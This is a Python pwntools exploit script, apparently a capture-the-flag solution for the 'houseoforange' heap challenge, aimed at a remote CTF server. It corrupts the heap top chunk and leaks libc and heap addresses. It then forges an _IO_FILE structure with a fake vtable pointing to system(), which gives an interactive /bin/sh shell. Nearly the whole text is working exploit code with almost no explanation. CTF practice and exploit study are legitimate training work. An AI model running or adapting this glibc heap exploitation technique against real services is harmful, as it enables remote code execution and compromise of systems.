from pwn import *
import os, sys
context.log_level = "debug"

r = remote("pwn.sixstars.team", 27100)
#r = process("/dbg/glibc/lib/ld-2.23.so ./houseoforange".split(" "))
#os.environ['LD_LIBRARY_PATH'] = '/dbg/glibc/lib/'
elf = ELF("./houseoforange")
#libc = ELF("/dbg/glibc/lib/libc-2.23.so")
libc = ELF("./libc-2.23.so")

#print r.pid
#pause()

def add(size):
    r.sendlineafter("choice : ", "1")
    r.sendlineafter("name :", str(size))    # length
    r.sendlineafter("Name :", "a")          # name
    r.sendlineafter("Orange:", "1")         # price
    r.sendlineafter("Orange:", "1")         # color

def addd(size, data):
    r.sendlineafter("choice : ", "1")
    r.sendlineafter("name :", str(size))    # length
    r.sendafter("Name :", data)          # name
    r.sendlineafter("Orange:", "1")         # price
    r.sendlineafter("Orange:", "1")         # color

def show():
    r.sendlineafter("choice : ", "2")

def edit(size, data):
    r.sendlineafter("choice : ", "3")
    r.sendlineafter("name :", str(size))
    r.sendafter("Name:", data)
    r.sendlineafter("Orange: ", "1")        # price
    r.sendlineafter("Orange: ", "1")        # color
    
add(0x10)
edit(0x40, p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1))

add(0x1000)

# leak libc
addd(0x400, 'a'*0x8)
show()
r.recvuntil("aaaaaaaa")
a = u64(r.recv(6)+'\x00'*2)
b = a-0x3c5188 #+0x29000     #0x3c4b78
libc.address = b
print "libx: " + hex(b)

# leak heap address
edit(0x400, 'a'*0x10)
show()
r.recvuntil('a'*0x10)
heap = u64(r.recv(6)+'\x00'*2) - 0xc0
print "heap: " + hex(heap)

#pause()

IO_list_all = libc.address + 0x3c5520
print "_IO_list_all: " + hex(IO_list_all)

vtable = heap + 0xd0 + 0x410 + 0x10 + 0xd8 + 0x8
print "vtable: " + hex(vtable)

#   mode: 0xc0   write_base: 0x20   write_ptr: 0x28

sh = 'b'*0x410
sh += p32(0x1) + p32(0x1f) + p64(0)                     # maybe useless. just remain price and color

sh += "/bin/sh\x00" + p64(0x61)                         # _IO_FILE
sh += p64(0) + p64(IO_list_all-0x10)                    # heap fd, bk
sh += p64(0) + p64(1)                                   # write_ptr > write_base
sh += p64(0)*((0xd8 - 0x20 - 0x10)/8) + p64(vtable)     # vtable pointer

sh += p64(0)*3 + p64(libc.sym['system'])                # fake vtable
sh += '\n'

edit(0x800, sh)

r.send("1")

r.interactive()         # chances to fail
